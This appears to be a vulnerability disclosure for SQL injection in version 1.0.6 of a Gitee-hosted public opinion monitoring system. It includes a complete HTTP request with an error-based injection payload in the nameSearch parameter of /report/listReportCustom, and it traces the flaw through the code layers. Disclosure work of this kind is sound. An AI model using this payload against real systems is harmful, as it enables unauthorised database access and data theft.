### SQL injection exists in the public opinion monitoring network monitoring system



### Project address https: gitee.com/stonedtx/yuqing Affected version 1.0.6



### Vulnerability analysis Log in as a test user. Access the /report/listReportCustom interface and construct the following data package for the interface:

```
POST /report/listReportCustom HTTP/1.1
Host: 127.0.0.1:8084
Content-Length: 112
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:8084
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8084/report?groupid=1493154486150107136&projectid=1493154645181337600&search=&type=1&page=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1691376050; local-portal=77E068CB3DBFA3E311237A3E65D6E77E; Hm_lvt_e0ae7650bd7b3442428280c81a85f60b=1691564381; Hm_lvt_f17e264e40b4ac75672813c1a2ae7110=1691564381; Hm_lpvt_e0ae7650bd7b3442428280c81a85f60b=1691564960; Hm_lpvt_f17e264e40b4ac75672813c1a2ae7110=1691564960
Connection: close

pageNum=1&reportType=1&nameSearch=') and updatexml(1,concat(0x7e,user()),1) and ('&projectId=1493155905573883904
```

sqlmap

![img](https://cdn-images-1.medium.com/max/900/0*Og7L93JUdMjQYJMP)

![img](https://cdn-images-1.medium.com/max/900/0*NNgCZmzL_cYbtJT6)

### code analysis

Check that there is sql splicing in the listReportCustom statement in src/main/resources/mapper/ReportCustomMapper.xml.

![img](https://cdn-images-1.medium.com/max/900/0*iOe-IbV2Ku3gDs6O)

Go to the first floor.

![img](https://cdn-images-1.medium.com/max/900/0*DepB5AYFqIVWjTeT)

Service layer

![img](https://cdn-images-1.medium.com/max/900/0*EOzQ3vTRNxGcgXJG)

Service instantiated class

![img](https://cdn-images-1.medium.com/max/900/0*qrI9h4ho4ex7r3lH)

Controller layer. There is no filtering during program calls. You can directly inject the “/report/listReportCustom” interface construction parameters.

![img](https://cdn-images-1.medium.com/max/900/0*MMkOOxWVJowT-tcn)